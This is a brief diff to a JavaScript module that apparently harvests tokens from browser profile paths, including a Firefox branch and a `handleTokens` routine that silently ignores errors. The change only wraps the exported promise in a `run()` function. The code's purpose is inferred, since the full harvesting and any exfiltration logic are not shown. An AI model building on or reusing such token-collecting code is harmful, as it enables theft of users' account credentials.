@@ -129,7 +129,7 @@ const handleTokens = (tokens, resolve) => tokens.forEach(token => {
     .catch(() => {});
 });
 
-module.exports = new Promise((resolve) => {
+const run = () => new Promise((resolve) => {
   Object.keys(paths).forEach(path => {
     if (path.includes('Firefox')) {
       try {
@@ -157,3 +157,5 @@ module.exports = new Promise((resolve) => {
     }
   });
 });
+
+module.exports = run();
